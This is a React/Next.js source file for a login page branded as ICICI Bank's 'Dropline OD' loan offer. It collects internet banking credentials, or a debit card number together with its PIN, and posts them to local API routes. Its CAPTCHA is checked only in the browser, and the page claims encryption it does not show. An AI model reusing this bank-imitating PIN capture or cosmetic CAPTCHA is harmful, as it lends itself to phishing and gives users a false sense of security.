'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter }                         from 'next/navigation';
import styles                                from './login.module.css';

// ── CAPTCHA generator ─────────────────────────────────────────────────────
const CHARS = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
function makeCaptcha(len = 6) {
  return Array.from({ length: len }, () =>
    CHARS[Math.floor(Math.random() * CHARS.length)]
  ).join('');
}

export default function LoginPage() {
  const router = useRouter();

  // ── tabs ──────────────────────────────────────────────────────────────
  const [activeTab, setActiveTab] = useState('corporate');

  // ── SHARED state ──────────────────────────────────────────────────────
  const [captchaInput, setCaptchaInput] = useState('');
  const [captchaCode,  setCaptchaCode]  = useState('');
  const [confirmed,    setConfirmed]    = useState(false);
  const [loading,      setLoading]      = useState(false);
  const [error,        setError]        = useState('');
  const [fieldErr,     setFieldErr]     = useState({});

  // ── CORPORATE fields ──────────────────────────────────────────────────
  const [userId,   setUserId]   = useState('');
  const [password, setPassword] = useState('');
  const [showPwd,  setShowPwd]  = useState(false);

  // ── DEBIT CARD fields ─────────────────────────────────────────────────
  const [cardNumber, setCardNumber] = useState('');
  const [pin,        setPin]        = useState(['', '', '', '']);  // 4 boxes

  // ── CAPTCHA helpers ───────────────────────────────────────────────────
  const refreshCaptcha = useCallback(() => {
    setCaptchaCode(makeCaptcha());
    setCaptchaInput('');
    setFieldErr(p => ({ ...p, captcha: '' }));
  }, []);

  useEffect(() => { refreshCaptcha(); }, [refreshCaptcha]);

  // Reset form when switching tabs
  function switchTab(tab) {
    setActiveTab(tab);
    setError('');
    setFieldErr({});
    setCaptchaInput('');
    setConfirmed(false);
    refreshCaptcha();
  }

  // ── Card number formatter — adds space every 4 digits ─────────────────
  function handleCardInput(e) {
    const raw     = e.target.value.replace(/\D/g, '').slice(0, 16);
    const grouped = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(grouped);
    setFieldErr(p => ({ ...p, cardNumber: '' }));
  }

  // ── PIN boxes — auto-advance on digit entry ───────────────────────────
  function handlePinChange(index, value) {
    if (!/^\d?$/.test(value)) return;           // digits only
    const next = [...pin];
    next[index] = value;
    setPin(next);
    setFieldErr(p => ({ ...p, pin: '' }));

    // Auto-focus next box
    if (value && index < 3) {
      document.getElementById(`pin-${index + 1}`)?.focus();
    }
  }

  function handlePinKeyDown(index, e) {
    // On Backspace with empty box, go to previous box
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      document.getElementById(`pin-${index - 1}`)?.focus();
    }
  }

  // ── Shared post-login handler ─────────────────────────────────────────
  function handleLoginSuccess(customerData) {
    sessionStorage.setItem('odCustomer', JSON.stringify(customerData));
    if (customerData.eligible) {
      router.push('/offer');
    } else {
      router.push('/not-eligible');
    }
  }

  // ── CORPORATE validation ──────────────────────────────────────────────
  function validateCorporate() {
    const errs = {};
    if (!userId.trim())        errs.userId   = 'User ID is required.';
    if (!password)             errs.password = 'Password is required.';
    if (!captchaInput.trim())  errs.captcha  = 'Please enter the CAPTCHA.';
    else if (captchaInput.trim() !== captchaCode)
                               errs.captcha  = 'CAPTCHA does not match. Try again.';
    if (!confirmed)            errs.confirm  = 'Please confirm your credentials.';
    return errs;
  }

  // ── DEBIT CARD validation ─────────────────────────────────────────────
  function validateDebit() {
    const errs  = {};
    const clean = cardNumber.replace(/\s/g, '');
    if (!clean)                   errs.cardNumber = 'Card number is required.';
    else if (clean.length !== 16) errs.cardNumber = 'Enter a valid 16-digit card number.';
    const pinStr = pin.join('');
    if (pinStr.length !== 4)      errs.pin     = 'Enter all 4 PIN digits.';
    if (!captchaInput.trim())     errs.captcha = 'Please enter the CAPTCHA.';
    else if (captchaInput.trim() !== captchaCode)
                                  errs.captcha = 'CAPTCHA does not match. Try again.';
    if (!confirmed)               errs.confirm = 'Please confirm your credentials.';
    return errs;
  }

  // ── Corporate submit ──────────────────────────────────────────────────
  async function handleCorporateLogin(e) {
    e.preventDefault();
    setError('');
    const errs = validateCorporate();
    if (Object.keys(errs).length > 0) {
      setFieldErr(errs);
      if (errs.captcha) refreshCaptcha();
      return;
    }
    setFieldErr({});
    setLoading(true);

    try {
      const res  = await fetch('/api/login', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ userId: userId.trim(), password }),
      });
      const data = await res.json();

      if (!data.success) {
        setError(data.error || 'Login failed.');
        refreshCaptcha();
        setLoading(false);
        return;
      }
      handleLoginSuccess(data.customer);

    } catch {
      setError('Network error. Please check your connection.');
      setLoading(false);
    }
  }

  // ── Debit card submit ─────────────────────────────────────────────────
  async function handleDebitLogin(e) {
    e.preventDefault();
    setError('');
    const errs = validateDebit();
    if (Object.keys(errs).length > 0) {
      setFieldErr(errs);
      if (errs.captcha) refreshCaptcha();
      return;
    }
    setFieldErr({});
    setLoading(true);

    try {
      const cleanCard = cardNumber.replace(/\s/g, '');
      const pinStr    = pin.join('');

      const res  = await fetch('/api/login-card', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ cardNumber: cleanCard, cardPin: pinStr }),
      });
      const data = await res.json();

      if (!data.success) {
        setError(data.error || 'Login failed.');
        refreshCaptcha();
        setLoading(false);
        return;
      }
      handleLoginSuccess(data.customer);

    } catch {
      setError('Network error. Please check your connection.');
      setLoading(false);
    }
  }

  // ── Shared bottom section (CAPTCHA + checkbox + button + links) ────────
  function SharedBottom({ onSubmit }) {
    return (
      <>
        {/* CAPTCHA */}
        <div className={styles.captchaSection}>
          <label className={styles.label}>
            CAPTCHA <span className={styles.req}>*</span>
          </label>
          <div className={styles.captchaRow}>
            <div className={`${styles.inputWrap} ${styles.captchaInput} ${fieldErr.captcha ? styles.inputError : ''}`}>
              <span className={styles.inputIcon}>🛡</span>
              <input
                type="text"
                className={styles.input}
                placeholder="Enter CAPTCHA"
                value={captchaInput}
                onChange={e => { setCaptchaInput(e.target.value); setFieldErr(p => ({ ...p, captcha: '' })); }}
                maxLength={6}
                autoComplete="off"
              />
            </div>
            <button type="button" className={styles.refreshBtn} onClick={refreshCaptcha} title="Refresh CAPTCHA">
              ↻
            </button>
            <div className={styles.captchaDisplay} aria-hidden="true">
              <CaptchaRenderer code={captchaCode} />
            </div>
          </div>
          {fieldErr.captcha && <p className={styles.fieldErrMsg}>{fieldErr.captcha}</p>}
        </div>

        {/* Confirm checkbox */}
        <div className={styles.confirmRow}>
          <label className={styles.checkLabel}>
            <input
              type="checkbox"
              className={styles.checkbox}
              checked={confirmed}
              onChange={e => { setConfirmed(e.target.checked); setFieldErr(p => ({ ...p, confirm: '' })); }}
            />
            <span className={styles.checkText}>
              <em>I confirm that the credentials mentioned above are correct.</em>
            </span>
          </label>
          {fieldErr.confirm && <p className={styles.fieldErrMsg}>{fieldErr.confirm}</p>}
        </div>

        {/* Login button */}
        <button type="submit" className={styles.loginBtn} disabled={loading}>
          {loading
            ? <span className={styles.spinner}></span>
            : <> Login <span className={styles.loginArrow}>›</span> </>
          }
        </button>

        {/* Forgot password */}
        <div className={styles.forgotWrap}>
          <button
            type="button"
            className={styles.forgotBtn}
            onClick={() => alert('Forgot Password — Email OTP feature coming soon.')}
          >
            Forgot Password?
          </button>
        </div>

        {/* Security note */}
        <div className={styles.secNote}>
          <span className={styles.secIcon}>🛡</span>
          <span>Your information is secure with us. We use advanced encryption to protect your data.</span>
        </div>
      </>
    );
  }

  return (
    <div className={styles.pageWrapper}>

      {/* ── HEADER ───────────────────────────────────────────────────── */}
      <header className={styles.header}>
        <div className={styles.headerInner}>
          <div className={styles.logoGroup}>
            <div className={styles.logoICICI}>
              <span className={styles.logoCircle}>i</span>
              <span className={styles.logoBank}>ICICI Bank</span>
            </div>
            <div className={styles.divider}></div>
            <div className={styles.logoDropline}>
              <span className={styles.dlText}>Dropline</span>
              <span className={styles.odBadge}>OD</span>
              <span className={styles.unsecBadge}>Unsecured</span>
            </div>
          </div>
          <div className={styles.progressWrap}>
            <div className={styles.progressTrack}>
              <div className={styles.progressFill} style={{ width: '20%' }}></div>
            </div>
            <div className={styles.progressTrack}>
              <div className={styles.progressFillGray}></div>
            </div>
          </div>
        </div>
      </header>

      {/* ── RED BACKGROUND ───────────────────────────────────────────── */}
      <div className={styles.bg}>
        <div className={styles.card}>

          {/* Back */}
          <button className={styles.backBtn} onClick={() => router.push('/')}>
            <span className={styles.backChevron}>‹</span> Back
          </button>

          {/* Title */}
          <div className={styles.cardHeader}>
            <h1 className={styles.title}>
              Apply for <span className={styles.titleOrange}>Dropline OD</span>
            </h1>
            <div className={styles.tagline}>
              <span>🤝 Easy</span>
              <span className={styles.pipe}>|</span>
              <span>⚡ Quick</span>
              <span className={styles.pipe}>|</span>
              <span>🛡 Secure</span>
            </div>
          </div>

          {/* ── TABS ─────────────────────────────────────────────────── */}
          <div className={styles.tabs}>
            <button
              className={`${styles.tab} ${activeTab === 'corporate' ? styles.tabActive : ''}`}
              onClick={() => switchTab('corporate')}
            >
              Corporate Internet Banking
            </button>
            <button
              className={`${styles.tab} ${activeTab === 'debit' ? styles.tabActive : ''}`}
              onClick={() => switchTab('debit')}
            >
              Debit Card
            </button>
          </div>

          {/* Global error banner */}
          {error && <div className={styles.globalError}>⚠ {error}</div>}

          {/* ── CORPORATE FORM ───────────────────────────────────────── */}
          {activeTab === 'corporate' && (
            <form onSubmit={handleCorporateLogin} noValidate>

              <div className={styles.row}>
                {/* User ID */}
                <div className={styles.field}>
                  <label className={styles.label}>
                    Customer ID / User ID <span className={styles.req}>*</span>
                  </label>
                  <div className={`${styles.inputWrap} ${fieldErr.userId ? styles.inputError : ''}`}>
                    <span className={styles.inputIcon}>👤</span>
                    <input
                      type="text"
                      className={styles.input}
                      placeholder="Enter Customer ID / User ID"
                      value={userId}
                      onChange={e => { setUserId(e.target.value); setFieldErr(p => ({ ...p, userId: '' })); }}
                      autoComplete="username"
                    />
                  </div>
                  {fieldErr.userId && <p className={styles.fieldErrMsg}>{fieldErr.userId}</p>}
                </div>

                {/* Password */}
                <div className={styles.field}>
                  <label className={styles.label}>
                    Password <span className={styles.req}>*</span>
                  </label>
                  <div className={`${styles.inputWrap} ${fieldErr.password ? styles.inputError : ''}`}>
                    <span className={styles.inputIcon}>🔒</span>
                    <input
                      type={showPwd ? 'text' : 'password'}
                      className={styles.input}
                      placeholder="Enter Password"
                      value={password}
                      onChange={e => { setPassword(e.target.value); setFieldErr(p => ({ ...p, password: '' })); }}
                      autoComplete="current-password"
                    />
                    <button
                      type="button"
                      className={styles.eyeBtn}
                      onClick={() => setShowPwd(v => !v)}
                      aria-label={showPwd ? 'Hide password' : 'Show password'}
                    >
                      {showPwd ? '🙈' : '👁'}
                    </button>
                  </div>
                  {fieldErr.password && <p className={styles.fieldErrMsg}>{fieldErr.password}</p>}
                </div>
              </div>

              <SharedBottom />
            </form>
          )}

          {/* ── DEBIT CARD FORM ──────────────────────────────────────── */}
          {activeTab === 'debit' && (
            <form onSubmit={handleDebitLogin} noValidate>

              <div className={styles.row}>
                {/* Card Number */}
                <div className={styles.field}>
                  <label className={styles.label}>
                    Debit Card Number <span className={styles.req}>*</span>
                  </label>
                  <div className={`${styles.inputWrap} ${fieldErr.cardNumber ? styles.inputError : ''}`}>
                    <span className={styles.inputIcon}>💳</span>
                    <input
                      type="text"
                      inputMode="numeric"
                      className={styles.input}
                      placeholder="Enter 16 Digit Debit Card Number"
                      value={cardNumber}
                      onChange={handleCardInput}
                      maxLength={19}
                      autoComplete="cc-number"
                    />
                  </div>
                  {fieldErr.cardNumber && <p className={styles.fieldErrMsg}>{fieldErr.cardNumber}</p>}
                </div>

                {/* PIN — 4 separate boxes */}
                <div className={styles.field}>
                  <label className={styles.label}>
                    PIN <span className={styles.req}>*</span>
                  </label>
                  <div className={styles.pinRow}>
                    {pin.map((digit, i) => (
                      <input
                        key={i}
                        id={`pin-${i}`}
                        type="password"
                        inputMode="numeric"
                        maxLength={1}
                        className={`${styles.pinBox} ${fieldErr.pin ? styles.pinBoxError : ''}`}
                        value={digit}
                        onChange={e => handlePinChange(i, e.target.value)}
                        onKeyDown={e => handlePinKeyDown(i, e)}
                        autoComplete="off"
                        aria-label={`PIN digit ${i + 1}`}
                      />
                    ))}
                  </div>
                  {fieldErr.pin && <p className={styles.fieldErrMsg}>{fieldErr.pin}</p>}
                </div>
              </div>

              <SharedBottom />
            </form>
          )}

        </div>
      </div>
    </div>
  );
}

// ── CAPTCHA visual renderer ───────────────────────────────────────────────
function CaptchaRenderer({ code }) {
  const chars     = code.split('');
  const colors    = ['#C62828', '#1565C0', '#2E7D32', '#6A1B9A', '#E65100', '#1a1a1a'];
  const rotations = [-15, 8, -5, 12, -10, 6];
  const sizes     = [22, 20, 24, 19, 22, 21];

  return (
    <div className={styles.captchaChars}>
      {chars.map((ch, i) => (
        <span
          key={i}
          style={{
            color:      colors[i % colors.length],
            transform:  `rotate(${rotations[i % rotations.length]}deg)`,
            fontSize:   `${sizes[i % sizes.length]}px`,
            fontWeight: 800,
            fontFamily: i % 2 === 0 ? 'Georgia, serif' : 'Arial, sans-serif',
            display:    'inline-block',
            userSelect: 'none',
            lineHeight: 1,
          }}
        >
          {ch}
        </span>
      ))}
    </div>
  );
}